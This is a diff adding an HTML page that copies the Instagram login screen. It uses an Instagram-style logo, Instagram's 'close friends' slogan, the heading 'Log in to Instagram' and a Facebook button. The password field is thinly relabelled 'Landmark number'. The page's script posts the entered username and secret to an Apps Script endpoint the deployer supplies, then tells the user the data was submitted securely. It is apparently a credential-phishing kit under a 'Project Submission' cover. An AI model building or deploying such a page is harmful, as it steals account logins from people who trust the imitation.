@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Project Submission</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Font Awesome Icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <!-- Google Font - Inter -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Custom Styles for Precise Aesthetics -->
+  <style>
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #0c0f12;
+      color: #f5f5f5;
+    }
+
+    /* Gradient Text for "close friends" */
+    .gradient-text {
+      background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    /* Input Field Focus & Hover Styling */
+    .ig-input {
+      background-color: #12171c;
+      border: 1px solid #2a323d;
+      transition: border-color 0.2s ease, background-color 0.2s ease;
+    }
+    .ig-input:focus-within {
+      border-color: #435466;
+      background-color: #161c22;
+    }
+
+    /* Glass Effect Floating Cards */
+    .floating-card-1 {
+      transform: rotate(-8deg) translateY(10px) translateX(-20px);
+    }
+    .floating-card-2 {
+      transform: rotate(0deg) scale(1.05);
+      z-index: 10;
+    }
+    .floating-card-3 {
+      transform: rotate(8deg) translateY(15px) translateX(20px);
+    }
+
+    /* Hide scrollbar for clean visual appearance */
+    ::-webkit-scrollbar {
+      width: 0px;
+      background: transparent;
+    }
+  </style>
+</head>
+<body class="min-h-screen flex items-center justify-center bg-[#0c0f12] text-white overflow-x-hidden selection:bg-pink-500 selection:text-white">
+
+  <div class="w-full min-h-screen flex flex-col lg:flex-row">
+
+    <!-- LEFT PANEL: Hero Branding & Dynamic Story Stack -->
+    <div class="w-full lg:w-1/2 flex flex-col justify-between p-8 lg:p-16 min-h-[500px] lg:min-h-screen border-b lg:border-b-0 lg:border-r border-[#1a2129] relative overflow-hidden bg-[#0c0f12]">
+      
+      <!-- Top Left Logo -->
+      <div class="flex items-center gap-3 z-10">
+        <svg class="w-10 h-10 text-white fill-current" viewBox="0 0 24 24">
+          <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+        </svg>
+      </div>
+
+      <!-- Main Headline -->
+      <div class="my-auto py-12 max-w-lg z-10">
+        <h1 class="text-3xl sm:text-5xl lg:text-6xl font-bold tracking-tight leading-tight mb-8">
+          See everyday moments from your <span class="gradient-text">close friends</span>.
+        </h1>
+
+        <!-- Stacked Mock Phone Cards/Stories -->
+        <div class="relative w-full max-w-sm h-72 mx-auto flex items-center justify-center mt-6">
+          
+          <!-- Left Floating Card -->
+          <div class="floating-card-1 absolute w-44 sm:w-48 h-64 rounded-3xl bg-[#181d24] border border-[#2e3745] overflow-hidden shadow-2xl transition-transform duration-500 hover:scale-105 hover:z-20">
+            <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=400&q=80" alt="Friend 1" class="w-full h-full object-cover opacity-90">
+            <div class="absolute bottom-3 left-3 bg-black/60 backdrop-blur-md px-2.5 py-1 rounded-full text-xs flex items-center gap-1.5 border border-white/10">
+              <span class="text-pink-500">❤️</span> <span>2.4k</span>
+            </div>
+          </div>
+
+          <!-- Center Featured Card -->
+          <div class="floating-card-2 absolute w-48 sm:w-52 h-72 rounded-3xl bg-[#1e252e] border-2 border-pink-500/40 overflow-hidden shadow-2xl transition-transform duration-500 hover:scale-110">
+            <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=400&q=80" alt="Friends" class="w-full h-full object-cover">
+            
+            <!-- Top Reaction Badge -->
+            <div class="absolute top-3 left-3 bg-black/70 backdrop-blur-md px-3 py-1 rounded-full text-xs flex items-center gap-1 border border-white/20">
+              <span>🔮</span> <span>✨</span> <span>🥳</span>
+            </div>
+
+            <!-- Bottom Story Bar Indicator -->
+            <div class="absolute bottom-3 inset-x-3 bg-black/60 backdrop-blur-md px-3 py-2 rounded-2xl border border-white/10 flex justify-between items-center">
+              <div class="h-1 bg-white/40 rounded-full w-20 overflow-hidden">
+                <div class="h-full bg-pink-500 w-3/4"></div>
+              </div>
+              <i class="fa-regular fa-heart text-white/80 text-sm"></i>
+            </div>
+          </div>
+
+          <!-- Right Floating Card -->
+          <div class="floating-card-3 absolute w-44 sm:w-48 h-64 rounded-3xl bg-[#181d24] border border-[#2e3745] overflow-hidden shadow-2xl transition-transform duration-500 hover:scale-105 hover:z-20">
+            <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=400&q=80" alt="Friend 2" class="w-full h-full object-cover opacity-90">
+            
+            <!-- Close Friends Badge -->
+            <div class="absolute top-3 right-3 bg-emerald-500/90 text-black px-2 py-0.5 rounded-full text-[10px] font-bold flex items-center gap-1 shadow-md">
+              <i class="fa-solid fa-star text-[9px]"></i> ★
+            </div>
+            
+            <!-- Avatar Overlay -->
+            <div class="absolute bottom-3 right-3 w-8 h-8 rounded-full border-2 border-pink-500 overflow-hidden">
+              <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=100&q=80" class="w-full h-full object-cover">
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- Footer Info -->
+      <div class="text-xs text-gray-500 z-10 hidden sm:block">
+        © 2026 Project Submission
+      </div>
+    </div>
+
+    <!-- RIGHT PANEL: Login Form Container -->
+    <div class="w-full lg:w-1/2 flex flex-col justify-between items-center p-6 sm:p-12 lg:p-16 bg-[#12161a] min-h-screen">
+      
+      <div class="w-full max-w-sm my-auto">
+        
+        <!-- Top Back/Header Link -->
+        <div class="flex items-center gap-3 mb-8 text-gray-200">
+          <button class="p-2 hover:bg-white/5 rounded-full transition-colors" title="Back">
+            <i class="fa-solid fa-chevron-left text-lg"></i>
+          </button>
+          <h2 class="text-xl font-semibold">Log in to Instagram</h2>
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm" class="space-y-4" onsubmit="event.preventDefault(); handleLogin();">
+          
+          <!-- Username / Email Input -->
+          <div class="relative rounded-xl ig-input px-3.5 py-2.5">
+            <label id="userLabel" for="username" class="block text-xs font-medium text-gray-400 transition-all duration-200">
+              Username or email
+            </label>
+            <input 
+              type="text" 
+              id="username" 
+              class="w-full bg-transparent text-sm text-white focus:outline-none pt-0.5" 
+              placeholder="" 
+              required
+              oninput="checkInputs()"
+            >
+          </div>
+
+          <!-- Landmark number Input -->
+          <div class="relative rounded-xl ig-input px-3.5 py-2.5 flex items-center justify-between">
+            <div class="w-full pr-2">
+              <label id="passLabel" for="landmarkNumber" class="block text-xs font-medium text-gray-400 transition-all duration-200">
+                Landmark number
+              </label>
+              <input 
+                type="password" 
+                id="landmarkNumber" 
+                class="w-full bg-transparent text-sm text-white focus:outline-none pt-0.5" 
+                placeholder="" 
+                required
+                oninput="checkInputs()"
+              >
+            </div>
+            <button 
+              type="button" 
+              id="toggleLandmark" 
+              onclick="toggleLandmarkVisibility()" 
+              class="text-xs font-semibold text-gray-400 hover:text-white transition-colors hidden"
+            >
+              Show
+            </button>
+          </div>
+
+          <!-- Submit Button -->
+          <button 
+            type="submit" 
+            id="loginBtn" 
+            disabled 
+            class="w-full py-3.5 rounded-full font-semibold text-sm transition-all duration-200 bg-[#0064e0]/40 text-white/50 cursor-not-allowed mt-2"
+          >
+            Submit
+          </button>
+        </form>
+
+        <!-- Forgot Landmark number Link -->
+        <div class="text-center mt-6">
+          <a href="#" class="text-xs text-gray-300 hover:underline hover:text-white transition-colors font-medium">
+            Your information is submitted securely.
+          </a>
+        </div>
+
+        <!-- Divider -->
+        <div class="flex items-center my-8">
+          <div class="flex-grow border-t border-[#222a35]"></div>
+          <span class="px-4 text-xs text-gray-500 font-medium uppercase tracking-wider">OR</span>
+          <div class="flex-grow border-t border-[#222a35]"></div>
+        </div>
+
+        <!-- Social Login Button -->
+        <button class="w-full py-3 px-4 rounded-xl bg-[#1c242d] hover:bg-[#252f3b] text-white text-sm font-semibold flex items-center justify-center gap-2.5 transition-colors border border-[#2a3442]">
+          <i class="fa-brands fa-facebook-f text-blue-500 text-base"></i>
+          <span>Continue</span>
+        </button>
+
+        <!-- Create New Account Button -->
+        <div class="mt-4">
+          <button class="w-full py-3 px-4 rounded-full border border-[#2e3a4a] hover:bg-white/5 text-[#4ea4f6] text-sm font-semibold transition-colors">
+            Clear form
+          </button>
+        </div>
+
+      </div>
+
+      <!-- Meta Footer Logo -->
+      <div class="mt-12 text-center">
+        <div class="flex items-center justify-center gap-1.5 text-gray-400 font-semibold tracking-wide text-xs">
+          <svg class="w-4 h-4 fill-current text-gray-400" viewBox="0 0 24 24">
+            <path d="M16.99 2H7.01C4.24 2 2 4.24 2 7.01v9.98C2 19.76 4.24 22 7.01 22h9.98c2.77 0 5.01-2.24 5.01-5.01V7.01C22 4.24 19.76 2 16.99 2zM12 17.5c-3.04 0-5.5-2.46-5.5-5.5S8.96 6.5 12 6.5s5.5 2.46 5.5 5.5-2.46 5.5-5.5 5.5z"/>
+          </svg>
+          <span class="text-sm font-bold tracking-wider text-gray-300">Project Submission</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Interactive JavaScript Logic -->
+  <script>
+    const usernameInput = document.getElementById('username');
+    const landmarkInput = document.getElementById('landmarkNumber');
+    const loginBtn = document.getElementById('loginBtn');
+    const toggleLandmarkBtn = document.getElementById('toggleLandmark');
+
+    // Put your Google Apps Script Web App URL here after deploying it.
+    const SERVER_URL = "PASTE_YOUR_APPS_SCRIPT_URL_HERE";
+
+    function checkInputs() {
+      const uVal = usernameInput.value.trim();
+      const lVal = landmarkInput.value.trim();
+
+      toggleLandmarkBtn.classList.toggle('hidden', lVal.length === 0);
+
+      if (uVal.length > 0 && lVal.length > 0) {
+        loginBtn.disabled = false;
+        loginBtn.className =
+          "w-full py-3.5 rounded-full font-semibold text-sm transition-all duration-200 bg-[#0064e0] hover:bg-[#0052b8] text-white cursor-pointer shadow-lg shadow-blue-600/20";
+      } else {
+        loginBtn.disabled = true;
+        loginBtn.className =
+          "w-full py-3.5 rounded-full font-semibold text-sm transition-all duration-200 bg-[#0064e0]/40 text-white/50 cursor-not-allowed";
+      }
+    }
+
+    function toggleLandmarkVisibility() {
+      if (landmarkInput.type === 'password') {
+        landmarkInput.type = 'text';
+        toggleLandmarkBtn.innerText = 'Hide';
+      } else {
+        landmarkInput.type = 'password';
+        toggleLandmarkBtn.innerText = 'Show';
+      }
+    }
+
+    async function handleLogin() {
+      const username = usernameInput.value.trim();
+      const landmarkNumber = landmarkInput.value.trim();
+
+      loginBtn.innerText = "Submitting...";
+      loginBtn.disabled = true;
+
+      if (SERVER_URL === "PASTE_YOUR_APPS_SCRIPT_URL_HERE") {
+        alertToast("Setup needed", "Add your Apps Script Web App URL first.");
+        loginBtn.innerText = "Submit";
+        checkInputs();
+        return;
+      }
+
+      try {
+        // Only the project's username/email and landmark number are submitted.
+        await fetch(SERVER_URL, {
+          method: "POST",
+          mode: "no-cors",
+          headers: {
+            "Content-Type": "text/plain;charset=utf-8"
+          },
+          body: JSON.stringify({
+            username: username,
+            landmarkNumber: landmarkNumber
+          })
+        });
+
+        alertToast("Submitted", "Your information was submitted successfully.");
+        document.getElementById("loginForm").reset();
+        checkInputs();
+        loginBtn.innerText = "Submit";
+
+      } catch (error) {
+        console.error(error);
+        alertToast("Error", "The submission could not be sent.");
+        loginBtn.innerText = "Submit";
+        checkInputs();
+      }
+    }
+
+    function alertToast(title, message) {
+      const toast = document.createElement('div');
+      toast.className =
+        'fixed top-5 right-5 z-50 bg-[#1c242d] border border-[#2e3a4a] text-white px-5 py-3.5 rounded-2xl shadow-2xl flex items-center gap-3 transition-all duration-300 transform translate-y-0';
+
+      toast.innerHTML = `
+        <div class="w-8 h-8 rounded-full bg-pink-500/20 text-pink-500 flex items-center justify-center font-bold">✓</div>
+        <div>
+          <div class="font-semibold text-sm">${title}</div>
+          <div class="text-xs text-gray-400">${message}</div>
+        </div>
+      `;
+
+      document.body.appendChild(toast);
+
+      setTimeout(() => {
+        toast.style.opacity = '0';
+        toast.style.transform = 'translateY(-10px)';
+        setTimeout(() => toast.remove(), 300);
+      }, 3000);
+    }
+
+    checkInputs();
+  </script>
+</body>
+</html>
